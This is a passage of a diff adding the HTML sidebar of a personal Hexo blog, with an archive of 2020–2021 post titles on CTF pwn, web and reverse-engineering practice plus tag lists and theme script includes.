+            <a class="archive-post-title" href="/2021/09/16/BUU-WEB-0x30-0x3F/">BUU_WEB刷题_0x30-0x3F</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/12</span>
+            <a class="archive-post-title" href="/2021/09/12/BUU-WEB-0x20-0x2F/">BUU_WEB刷题_0x20-0x2F</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/01</span>
+            <a class="archive-post-title" href="/2021/09/01/tcache_stashing_unlink_atack%E8%B0%83%E8%AF%95/">Tcache_stashing_unlink_atack调试记录</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/08</span>
+            <a class="archive-post-title" href="/2021/08/08/pwn%E5%B0%8F%E6%80%BB%E7%BB%93/">PWN刷题小结</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/18</span>
+            <a class="archive-post-title" href="/2021/07/18/BUU-PWN-0x30-0x3f/">BUU_PWN刷题_0x30-0x3F</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/11</span>
+            <a class="archive-post-title" href="/2021/07/11/BUU-PWN-0x20-0x2F/">BUU_PWN刷题_0x21-0x2F</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">06/01</span>
+            <a class="archive-post-title" href="/2021/06/01/BUU-PWN-0x01-0x0F/">BUU_PWN刷题_0x01-0x0F</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">06/01</span>
+            <a class="archive-post-title" href="/2021/06/01/BUU-PWN-0x10-0x1F/">BUU_PWN刷题_0x10-0x1F</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/03</span>
+            <a class="archive-post-title" href="/2021/05/03/BUU-WEB-0x10-0x1F/">BUU_WEB刷题_0x10-0x1F</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/17</span>
+            <a class="archive-post-title" href="/2021/04/17/BUU-WEB-0x1-0xF/">BUU_WEB刷题_0x01-0x0F</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/08</span>
+            <a class="archive-post-title" href="/2021/04/08/64%E4%B8%BApayload%E8%B0%83%E7%94%A8system%E5%A4%B1%E8%B4%A5%E9%97%AE%E9%A2%98/">在64位的glibc上payload调用system导致crash的问题</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/08</span>
+            <a class="archive-post-title" href="/2021/04/08/CISCN-PWN/">CISCN_PWN</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/23</span>
+            <a class="archive-post-title" href="/2021/03/23/pwndbg%E5%92%8CLinux%E6%94%B9%E7%94%A8%E6%88%B7%E5%90%8D%E5%8F%8A%E5%AF%86%E7%A0%81%E8%B8%A9%E5%9D%91/">pwndbg和Linux改用户名及密码踩坑</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/22</span>
+            <a class="archive-post-title" href="/2021/03/22/chunk-extend-and-overlapping/">Chunk Extend and Overlapping</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/21</span>
+            <a class="archive-post-title" href="/2021/03/21/%E5%A0%86%E4%B8%AD%E7%9A%84off-by-one/">堆中的off-by-one</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/14</span>
+            <a class="archive-post-title" href="/2021/03/14/%E7%AE%80%E5%8D%95%E5%A0%86%E6%BA%A2%E5%87%BA%E4%BB%8B%E7%BB%8D/">简单堆溢出介绍</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/03</span>
+            <a class="archive-post-title" href="/2021/03/03/%E5%A0%86%E7%9B%B8%E5%85%B3%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/">堆概述及其相关数据结构</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/03</span>
+            <a class="archive-post-title" href="/2021/03/03/%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA/">整数溢出</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">02/27</span>
+            <a class="archive-post-title" href="/2021/02/27/json%E7%9B%B8%E5%85%B3/">JSON相关</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">02/12</span>
+            <a class="archive-post-title" href="/2021/02/12/2020%E5%B9%B4%E9%83%BD%E5%B9%B2%E4%BA%86%E5%95%A5/">2020年都干了啥</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">02/10</span>
+            <a class="archive-post-title" href="/2021/02/10/ret2csu/">Ret2csu</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">02/06</span>
+            <a class="archive-post-title" href="/2021/02/06/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E4%B8%BE%E4%BE%8B/">格式化字符串漏洞举例</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">02/02</span>
+            <a class="archive-post-title" href="/2021/02/02/Linux%E4%BF%9D%E6%8A%A4%E6%8A%80%E6%9C%AF/">Linux保护技术</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">02/01</span>
+            <a class="archive-post-title" href="/2021/02/01/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%8E%9F%E7%90%86%E4%BB%8B%E7%BB%8D%E5%8F%8A%E5%88%A9%E7%94%A8/">格式化字符串原理介绍及利用</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/28</span>
+            <a class="archive-post-title" href="/2021/01/28/pwn_ret2libc/">PWN_Ret2libc</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/27</span>
+            <a class="archive-post-title" href="/2021/01/27/pwn_ret2textret2syscallret2shellcode/">PWN_ret2text,ret2syscall,ret2shellcode</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/23</span>
+            <a class="archive-post-title" href="/2021/01/23/pip%E4%B8%8B%E8%BD%BD%E8%BF%87%E6%85%A2%E8%A7%A3%E5%86%B3%E5%8A%9E%E6%B3%95/">pip下载过慢解决办法</a>
+        </li>
+    
+        
+            
+            
+                
+                </ul>
+            
+            <div class="archive-year"> 2020 </div>
+            <ul class="year-list">
+            
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/25</span>
+            <a class="archive-post-title" href="/2020/11/25/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/">文件包含漏洞</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/23</span>
+            <a class="archive-post-title" href="/2020/11/23/python__requestsocket%E6%A8%A1%E5%9D%97/">Python__request，socket模块</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/22</span>
+            <a class="archive-post-title" href="/2020/11/22/BUU-RE-1/">BUU_RE_1</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/21</span>
+            <a class="archive-post-title" href="/2020/11/21/python__re%E6%A8%A1%E5%9D%97%E4%B8%8E%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/">Python__RE模块与正则表达式</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/19</span>
+            <a class="archive-post-title" href="/2020/11/19/SQL%E6%B3%A8%E5%85%A5%E5%B0%8F%E7%BB%93/">SQL注入小结</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/11</span>
+            <a class="archive-post-title" href="/2020/10/11/%E6%B1%87%E7%BC%96%E7%AC%94%E8%AE%B0/">汇编笔记</a>
+        </li>
+    
+    </div>
+</div>
+
+        <div class="sidebar-panel-tags">
+    <div class="sidebar-tags-name">
+        
+            <span class="sidebar-tag-name" data-tags="Life">
+                <span class="iconfont-archer">&#xe606;</span>
+                Life
+            </span>
+        
+            <span class="sidebar-tag-name" data-tags="PWN">
+                <span class="iconfont-archer">&#xe606;</span>
+                PWN
+            </span>
+        
+            <span class="sidebar-tag-name" data-tags="RE">
+                <span class="iconfont-archer">&#xe606;</span>
+                RE
+            </span>
+        
+            <span class="sidebar-tag-name" data-tags="BUU刷题">
+                <span class="iconfont-archer">&#xe606;</span>
+                BUU刷题
+            </span>
+        
+            <span class="sidebar-tag-name" data-tags="WEB">
+                <span class="iconfont-archer">&#xe606;</span>
+                WEB
+            </span>
+        
+            <span class="sidebar-tag-name" data-tags="VulnHub">
+                <span class="iconfont-archer">&#xe606;</span>
+                VulnHub
+            </span>
+        
+            <span class="sidebar-tag-name" data-tags="渗透">
+                <span class="iconfont-archer">&#xe606;</span>
+                渗透
+            </span>
+        
+            <span class="sidebar-tag-name" data-tags="漏洞复现">
+                <span class="iconfont-archer">&#xe606;</span>
+                漏洞复现
+            </span>
+        
+            <span class="sidebar-tag-name" data-tags="Python">
+                <span class="iconfont-archer">&#xe606;</span>
+                Python
+            </span>
+        
+            <span class="sidebar-tag-name" data-tags="Linux">
+                <span class="iconfont-archer">&#xe606;</span>
+                Linux
+            </span>
+        
+            <span class="sidebar-tag-name" data-tags="内网">
+                <span class="iconfont-archer">&#xe606;</span>
+                内网
+            </span>
+        
+            <span class="sidebar-tag-name" data-tags="汇编">
+                <span class="iconfont-archer">&#xe606;</span>
+                汇编
+            </span>
+        
+            <span class="sidebar-tag-name" data-tags="OS">
+                <span class="iconfont-archer">&#xe606;</span>
+                OS
+            </span>
+        
+            <span class="sidebar-tag-name" data-tags="WriteUp">
+                <span class="iconfont-archer">&#xe606;</span>
+                WriteUp
+            </span>
+        
+    </div>
+    <div class="iconfont-archer sidebar-tags-empty">&#xe678;</div>
+    <div class="tag-load-fail" style="display: none; color: #ccc; font-size: 0.6rem;">
+        缺失模块，请参考主题文档进行安装配置：https://github.com/fi3ework/hexo-theme-archer#%E5%AE%89%E8%A3%85%E4%B8%BB%E9%A2%98
+    </div> 
+    <div class="sidebar-tags-list"></div>
+</div>
+
+        <div class="sidebar-panel-categories">
+    <div class="sidebar-categories-name">
+    
+    </div>
+    <div class="iconfont-archer sidebar-categories-empty">&#xe678;</div>
+    <div class="sidebar-categories-list"></div>
+</div>
+
+    </div>
+</div>
+
+        <!-- site-meta -->
+        <script>
+    var siteMeta = {
+        root: "/",
+        author: "郁涛丶"
+    }
+</script>
+
+        <!-- main func -->
+        <script src="/scripts/main.js"></script>
+        <!-- fancybox -->
+        <script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js" defer></script>
+        <!-- algolia -->
+        
+        <!-- busuanzi -->
+        
+        <!-- CNZZ -->
+        
+        <!-- async load share.js -->
+        
+            <script src="/scripts/share.js" async></script>    
+        
+        <!-- mermaid -->
+        
+    </body>
+</html>
